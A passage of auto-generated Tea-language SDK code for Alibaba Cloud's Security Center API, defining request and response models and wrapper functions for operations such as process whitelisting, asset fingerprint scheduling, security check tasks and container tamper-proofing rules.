  return modifyPostPayModuleSwitchWithOptions(request, runtime);
}

model ModifyProcessWhiteListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  md5s?: string(name='Md5s', description='The MD5 hash value of the process startup file.

>  You can call the [DescribeWhiteListProcess](~~DescribeWhiteListProcess~~) operation to obtain the MD5 hash value.

This parameter is required.', example='001d7f68c3b44147988f0dc81192****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='173.128.XX.XX'),
  status?: int32(name='Status', description='The whitelist status of the process. Valid values:

*   **1**: removes a process from the whitelist.
*   **2**: adds a process to the whitelist.

This parameter is required.', example='1'),
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeWhiteListStrategyList](~~DescribeWhiteListStrategyList~~) operation to obtain the ID.

This parameter is required.', example='1'),
}

model ModifyProcessWhiteListResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='11C96623-E106-59C9-866D-A6C82911****'),
}

model ModifyProcessWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyProcessWhiteListResponseBody(name='body'),
}

/**
 * @summary Adds a process to or removes a process from the whitelist by using the application whitelist feature.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request ModifyProcessWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyProcessWhiteListResponse
 */
async function modifyProcessWhiteListWithOptions(request: ModifyProcessWhiteListRequest, runtime: Util.RuntimeOptions): ModifyProcessWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.md5s)) {
    query['Md5s'] = request.md5s;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyProcessWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds a process to or removes a process from the whitelist by using the application whitelist feature.
 *
 * @description The application whitelist feature is in public preview. You cannot apply for a trial of the feature. If you applied for a trial of the feature or the feature is in use, you can call this operation.
 *
 * @param request ModifyProcessWhiteListRequest
 * @return ModifyProcessWhiteListResponse
 */
async function modifyProcessWhiteList(request: ModifyProcessWhiteListRequest): ModifyProcessWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyProcessWhiteListWithOptions(request, runtime);
}

model ModifyPropertyScheduleConfigRequest {
  scheduleTime?: string(name='ScheduleTime', description='The new collection frequency of asset fingerprints. Valid values:

*   **0**: disabled, which indicates that the asset fingerprints are not automatically or periodically collected.
*   **1**: collects asset fingerprints once an hour.
*   **3**: collects asset fingerprints once every 3 hours.
*   **12**: collects asset fingerprints once every 12 hours.
*   **24**: collects asset fingerprints once a day.
*   **168**: collects asset fingerprints once every 7 days.

This parameter is required.', example='3'),
  type?: string(name='Type', description='The type of the asset fingerprints for which you want to modify the collection frequency. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware, database, or web service
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website

This parameter is required.', example='scheduler_port_period'),
}

model ModifyPropertyScheduleConfigResponseBody = {
  modifyResult?: boolean(name='ModifyResult', description='Indicates whether the collection frequency of asset fingerprints is modified. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C0D1DF51-D879-55A8-B6C7-7D3B913EF34D'),
}

model ModifyPropertyScheduleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyPropertyScheduleConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the collection frequency of asset fingerprints for an automatic periodic collection task.
 *
 * @param request ModifyPropertyScheduleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyPropertyScheduleConfigResponse
 */
async function modifyPropertyScheduleConfigWithOptions(request: ModifyPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifyPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scheduleTime)) {
    query['ScheduleTime'] = request.scheduleTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the collection frequency of asset fingerprints for an automatic periodic collection task.
 *
 * @param request ModifyPropertyScheduleConfigRequest
 * @return ModifyPropertyScheduleConfigResponse
 */
async function modifyPropertyScheduleConfig(request: ModifyPropertyScheduleConfigRequest): ModifyPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPropertyScheduleConfigWithOptions(request, runtime);
}

model ModifyPushAllTaskRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  tasks?: string(name='Tasks', description='The check items. Separate multiple check items with commas (,). Valid values:

*   **OVAL_ENTITY**: Common Vulnerabilities and Exposures (CVE) vulnerabilities
*   **CMS**: Web-CMS vulnerabilities
*   **SYSVUL**: Windows system vulnerabilities
*   **SCA**: application vulnerabilities
*   **HEALTH_CHECK**: baselines
*   **WEBSHELL**: webshells
*   **PROC_SNAPSHOT**: processes
*   **PORT_SNAPSHOT**: ports
*   **ACCOUNT_SNAPSHOT**: accounts
*   **SOFTWARE_SNAPSHOT**: software assets
*   **SCA_SNAPSHOT**: middleware

This parameter is required.', example='HEALTH_CHECK,OVAL_ENTITY'),
  uuids?: string(name='Uuids', description='The UUIDs of servers on which you want to perform security check tasks. Separate multiple UUIDs with commas (,).

This parameter is required.', example='inet-923b4538-0e88-409d-80ba-cb2e7487****,dc1691eb-656f-472f-b2aa-04f621f4****,70452f92-9fc1-45c5-ab35-e7bf8552****'),
}

model ModifyPushAllTaskResponseBody = {
  pushTaskRsp?: {
    pushTaskResultList?: [ 
      {
        groupId?: long(name='GroupId', description='The ID of the server group to which the server belongs.', example='226'),
        instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-wz9f7wlklxqnvdk****'),
        instanceName?: string(name='InstanceName', description='The name of the server.', example='TestInstance'),
        ip?: string(name='Ip', description='The IP address of the server.', example='127.XX.XX'),
        message?: string(name='Message', description='The message that describes the security check failure.', example='successful'),
        online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**: yes
*   **false**: no

>  If the Security Center agent of the server is offline, Security Center does not protect the server.', example='false'),
        osVersion?: string(name='OsVersion', description='The operating system version of the server.', example='linux'),
        region?: string(name='Region', description='The region in which the server resides.', example='cn-beijing'),
        success?: boolean(name='Success', description='Indicates whether the security check task is successful. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
        uuid?: string(name='Uuid', description='The UUID of the server.', example='5493fe42-61f5-4627-9aa2-8c449bbe****'),
      }
    ](name='PushTaskResultList', description='An array consisting of the servers on which security check tasks failed.'),
  }(name='PushTaskRsp', description='The results of security check tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='91EB4AC7-7FEF-4C72-BE49-4414E459AEC2'),
}

model ModifyPushAllTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyPushAllTaskResponseBody(name='body'),
}

/**
 * @summary Performs security check tasks on servers with a few clicks.
 *
 * @param request ModifyPushAllTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyPushAllTaskResponse
 */
async function modifyPushAllTaskWithOptions(request: ModifyPushAllTaskRequest, runtime: Util.RuntimeOptions): ModifyPushAllTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tasks)) {
    query['Tasks'] = request.tasks;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPushAllTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Performs security check tasks on servers with a few clicks.
 *
 * @param request ModifyPushAllTaskRequest
 * @return ModifyPushAllTaskResponse
 */
async function modifyPushAllTask(request: ModifyPushAllTaskRequest): ModifyPushAllTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPushAllTaskWithOptions(request, runtime);
}

model ModifyRefreshProcessInfoRequest {
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.', example='0f3b8f76-90e5-4455-a5aa-23ce30b5****'),
}

model ModifyRefreshProcessInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='814FCBBC-3A02-5555-8D05-F8D9FD62A295'),
}

model ModifyRefreshProcessInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyRefreshProcessInfoResponseBody(name='body'),
}

/**
 * @summary Refreshes the list of processes that are associated with a Linux software vulnerability.
 *
 * @param request ModifyRefreshProcessInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyRefreshProcessInfoResponse
 */
async function modifyRefreshProcessInfoWithOptions(request: ModifyRefreshProcessInfoRequest, runtime: Util.RuntimeOptions): ModifyRefreshProcessInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRefreshProcessInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Refreshes the list of processes that are associated with a Linux software vulnerability.
 *
 * @param request ModifyRefreshProcessInfoRequest
 * @return ModifyRefreshProcessInfoResponse
 */
async function modifyRefreshProcessInfo(request: ModifyRefreshProcessInfoRequest): ModifyRefreshProcessInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRefreshProcessInfoWithOptions(request, runtime);
}

model ModifySasContainerWebDefenseRuleRequest {
  pathConfDTOList?: [ 
    {
      backupPath?: string(name='BackupPath', description='The backup paths.', example='/tmp/test'),
      defenseMode?: string(name='DefenseMode', description='The prevention mode. Valid values:

*   **block**
*   **audit**

This parameter is required.', example='audit'),
      defensePath?: string(name='DefensePath', description='The path that is protected.

This parameter is required.', example='/test/home/'),
      excludeFile?: string(name='ExcludeFile', description='The files that are excluded.', example='/usr/test'),
      excludeFilePath?: string(name='ExcludeFilePath', description='The paths to the files that are excluded.', example='/test/home/qq'),
      excludeFileType?: string(name='ExcludeFileType', description='The types of the files that are excluded.', example='php'),
      guardType?: int32(name='GuardType', description='The protection mode. Valid values:

*   **0**: basic mode (whitelist)
*   **1**: complex mode (blacklist)

This parameter is required.', example='0'),
      includeFile?: string(name='IncludeFile', description='The files that are included.', example='/home/admin/test'),
      includeFileType?: string(name='IncludeFileType', description='The type of the files that are included.', example='jsp'),
      pathConfId?: long(name='PathConfId', description='The path ID.', example='12345678'),
      processPathList?: [ string ](name='ProcessPathList', description='The processes that are added to the whitelist.'),
    }
  ](name='PathConfDTOList', description='The paths that are protected.'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

This parameter is required.', example='200634'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='wwwwwww'),
}

model ModifySasContainerWebDefenseRuleResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='A447E4E3-42A3-58B7-A7D4-2287745BEFDC'),
}

model ModifySasContainerWebDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifySasContainerWebDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Modifies a rule for container tamper-proofing.
 *
 * @param request ModifySasContainerWebDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifySasContainerWebDefenseRuleResponse
 */
async function modifySasContainerWebDefenseRuleWithOptions(request: ModifySasContainerWebDefenseRuleRequest, runtime: Util.RuntimeOptions): ModifySasContainerWebDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pathConfDTOList)) {
    query['PathConfDTOList'] = request.pathConfDTOList;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySasContainerWebDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a rule for container tamper-proofing.
 *
 * @param request ModifySasContainerWebDefenseRuleRequest
 * @return ModifySasContainerWebDefenseRuleResponse
 */
async function modifySasContainerWebDefenseRule(request: ModifySasContainerWebDefenseRuleRequest): ModifySasContainerWebDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySasContainerWebDefenseRuleWithOptions(request, runtime);
}

model ModifySearchConditionRequest {
  filterConditions?: string(name='FilterConditions', description='The filter condition. The value of this parameter is in the JSON format and is case-sensitive. The value contains the following fields:

*   **filterParams**: the filter-related parameters. The value is in the JSON format. Valid values:

    *   **label**: the display name of the filter condition in the console.

    *   **value**: the settings of the filter condition. The value is in the JSON format. The value contains the following fields:

        *   **name**: the name of the field for filtering. For more information, see the value description of name.
        *   **value**: the value of the field for filtering.

*   **LogicalExp**: the logical relationship among multiple filter conditions. Valid values:

    *   **OR**
    *   **AND**

>  Value description of **name**:

*   If **Type** is set to **ecs**, you can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported filter conditions.

*   If **Type** is set to **cloud_product**, you can call the [GetCloudAssetCriteria](~~GetCloudAssetCriteria~~) operation to query the supported filter conditions.', example='{
    "filterParams": [
        {
            "label": "UUID：xxx",
            "value": "{\\\\"name\\\\":\\\\"uuidList\\\\",\\\\"value\\\\":\\\\"xxx\\\\"}"
        }
    ],
    "LogicalExp": "OR"
}'),
  name?: string(name='Name', description='The name of the common filter condition.

This parameter is required.', example='test'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='27.223.XX.XX'),
  type?: string(name='Type', description='The type of the asset. Default value: **ecs**. Valid values:

*   **ecs**: host
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
}

model ModifySearchConditionResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='9DFFCF83-4F7B-5E05-B82D-3B619D5****'),
}

model ModifySearchConditionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifySearchConditionResponseBody(name='body'),
}

/**
 * @summary Modifies common filter conditions to search for assets.
 *
 * @param request ModifySearchConditionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifySearchConditionResponse
 */
async function modifySearchConditionWithOptions(request: ModifySearchConditionRequest, runtime: Util.RuntimeOptions): ModifySearchConditionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.filterConditions)) {
    query['FilterConditions'] = request.filterConditions;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySearchCondition',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies common filter conditions to search for assets.
 *
 * @param request ModifySearchConditionRequest
 * @return ModifySearchConditionResponse
 */
async function modifySearchCondition(request: ModifySearchConditionRequest): ModifySearchConditionResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySearchConditionWithOptions(request, runtime);
}

model ModifySecurityCheckScheduleConfigRequest {
  daysOfWeek?: string(name='DaysOfWeek', description='The days on which the automatic configuration check runs. You can specify multiple days. Separate multiple days with commas (,). Valid values:

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday

This parameter is required.', example='4,5,6'),
  endTime?: int32(name='EndTime', description='The time period during which the automatic configuration check ends. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00

This parameter is required.', example='12'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  startTime?: int32(name='StartTime', description='The time period during which the automatic configuration check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00

This parameter is required.', example='6'),
}

model ModifySecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='02287C0D-8DA9-5766-B51A-A63192BD3E80'),
}

model ModifySecurityCheckScheduleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifySecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI ModifySecurityCheckScheduleConfig is deprecated, please use Sas::2018-12-03::ChangeCheckConfig instead.
 *
 * @summary Specifies the time when an automatic configuration check is performed on cloud services.
 *
 * @description This operation is phased out. You can use the ChangeCheckConfig operation.
 *
 * @param request ModifySecurityCheckScheduleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfigWithOptions(request: ModifySecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifySecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.daysOfWeek)) {
    query['DaysOfWeek'] = request.daysOfWeek;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI ModifySecurityCheckScheduleConfig is deprecated, please use Sas::2018-12-03::ChangeCheckConfig instead.
 *
 * @summary Specifies the time when an automatic configuration check is performed on cloud services.
 *
 * @description This operation is phased out. You can use the ChangeCheckConfig operation.
 *
 * @param request ModifySecurityCheckScheduleConfigRequest
 * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfig(request: ModifySecurityCheckScheduleConfigRequest): ModifySecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityCheckScheduleConfigWithOptions(request, runtime);
}

model ModifySecurityEventMarkMissIndividuallyRequest {
  deleteMarkMissParam?: string(name='DeleteMarkMissParam', description='The alert handling rule that you want to delete.', example='[{\\\\"field\\\\":\\\\"loginSourceIp\\\\",\\\\"operate\\\\":\\\\"contains\\\\",\\\\"eventType\\\\":\\\\"SIL_AI_ALERT\\\\",\\\\"eventName\\\\":\\\\"login_common_ip\\\\",\\\\"fieldValue\\\\":\\\\"10.12.XX.XX\\\\",\\\\"uuids\\\\":\\\\"\\\\"}]'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  insertMarkMissParam?: string(name='InsertMarkMissParam', description='The alert handling that you want to add.', example='[{\\\\"field\\\\":\\\\"location\\\\",\\\\"operate\\\\":\\\\"contains\\\\",\\\\"eventType\\\\":\\\\"SIL_AI_ALERT\\\\",\\\\"eventName\\\\":\\\\"login_common_ip\\\\",\\\\"fieldValue\\\\":\\\\"xx\\\\",\\\\"uuids\\\\":\\\\"4296ee47-bf19-4fa4-a4a6-6bxxxxxxxxx\\\\"}]'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='127.0.XX.XX'),
}

model ModifySecurityEventMarkMissIndividuallyResponseBody = {
  code?: string(name='Code', description='The status code of the alert event.

*   **200**: indicates that the alert event is successfully handled.
*   Other codes: indicates that the alert event fails to be handled.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='A37B852F-E346-5FF2-82BD-D1F1DXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  timeCost?: long(name='TimeCost', description='The time that was consumed to process the request. Unit: milliseconds.', example='1'),
}

model ModifySecurityEventMarkMissIndividuallyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifySecurityEventMarkMissIndividuallyResponseBody(name='body'),
}

/**
 * @summary Modifies the alert handling rule for alerts that are added to the whitelist by asset.
 *
 * @param request ModifySecurityEventMarkMissIndividuallyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifySecurityEventMarkMissIndividuallyResponse
 */
async function modifySecurityEventMarkMissIndividuallyWithOptions(request: ModifySecurityEventMarkMissIndividuallyRequest, runtime: Util.RuntimeOptions): ModifySecurityEventMarkMissIndividuallyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.deleteMarkMissParam)) {
    body['DeleteMarkMissParam'] = request.deleteMarkMissParam;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.insertMarkMissParam)) {
    body['InsertMarkMissParam'] = request.insertMarkMissParam;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityEventMarkMissIndividually',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the alert handling rule for alerts that are added to the whitelist by asset.
 *
 * @param request ModifySecurityEventMarkMissIndividuallyRequest
 * @return ModifySecurityEventMarkMissIndividuallyResponse
 */
async function modifySecurityEventMarkMissIndividually(request: ModifySecurityEventMarkMissIndividuallyRequest): ModifySecurityEventMarkMissIndividuallyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityEventMarkMissIndividuallyWithOptions(request, runtime);
}

model ModifyServerlessAuthToMachineRequest {
  appCriteria?: string(name='AppCriteria', description='Application query condition.', example='**7ad7e3a'),
  authItem?: string(name='AuthItem', description='Instance type. Values:
- **SERVERLESS**: Serverless asset', example='SERVERLESS'),
  autoBind?: int32(name='AutoBind', description='Enable auto-binding. Values:

- **0**: Off
- **1**: On', example='1'),
  bindAll?: boolean(name='BindAll', description='Whether to bind all. Default is **false**. Values:

- **true**: Yes
- **false**: No', example='false'),
  bindAppList?: [ string ](name='BindAppList', description='List of application IDs to be bound.

> Obtained through the [ListMachineApps](~~ListMachineApps~~) interface.'),
  bindAssetType?: string(name='BindAssetType', description='Type of asset to operate on. Values:
- **INSTANCE**: Instance
- **APP**: Application', example='APP'),
  bindUuidList?: [ string ](name='BindUuidList', description='List of asset UUIDs to be bound.'),
  criteria?: string(name='Criteria', description='Set the conditions for searching assets. This parameter is in JSON format, and case sensitivity should be noted when entering parameters.
> Supports searching assets using instance ID, instance name, VPC ID, region, public IP address, etc. You can call the [DescribeCriteria](~~DescribeCriteria~~) interface to query supported search conditions.', example='[{"name":"vulStatus","value":"YES","logicalExp":"AND"}]'),
  logicalExp?: string(name='LogicalExp', description='Set the logical relationship between multiple search conditions. Values:
- **OR**: Indicates an **or** relationship between multiple conditions.
- **AND**: Indicates an **and** relationship between multiple conditions.', example='OR'),
  ntmVersion?: string(name='NtmVersion', description='NTM version code, used for pre-binding.', example='level2'),
  preBind?: int32(name='PreBind', description='Whether it is a pre-bind operation. Values:

- **0**: No
- **1**: Yes


> After enabling pre-binding, the specified server will automatically bind the corresponding version\\\\"s authorization count after the purchase is completed.', example='1'),
  preBindOrderId?: long(name='PreBindOrderId', description='Pre-bind order ID.', example='233016**0482'),
  resourceDirectoryUid?: long(name='ResourceDirectoryUid', description='UID of the associated resource directory.', example='123456'),
  unBindAppList?: [ string ](name='UnBindAppList', description='List of application IDs to be unbound.

> Obtained through the [ListMachineApps](~~ListMachineApps~~) interface.'),
  unBindUuidList?: [ string ](name='UnBindUuidList', description='List of asset UUIDs to be unbound.'),
}

model ModifyServerlessAuthToMachineResponseBody = {
  data?: {
    resultCode?: int32(name='ResultCode', description='Result code. Values:
- **0**: Success
- **1**: Parameter error', example='0'),
  }(name='Data', description='Details of the returned data.'),
  requestId?: string(name='RequestId', description='本次调用请求的ID，是由阿里云为该请求生成的唯一标识符，可用于排查和定位问题。', example='A47F77A1***8CD37050E'),
}

model ModifyServerlessAuthToMachineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyServerlessAuthToMachineResponseBody(name='body'),
}

/**
 * @summary Manage Serverless Asset Authorization
 *
 * @param request ModifyServerlessAuthToMachineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyServerlessAuthToMachineResponse
 */
async function modifyServerlessAuthToMachineWithOptions(request: ModifyServerlessAuthToMachineRequest, runtime: Util.RuntimeOptions): ModifyServerlessAuthToMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appCriteria)) {
    query['AppCriteria'] = request.appCriteria;
  }
  if (!Util.isUnset(request.authItem)) {
    query['AuthItem'] = request.authItem;
  }
  if (!Util.isUnset(request.autoBind)) {
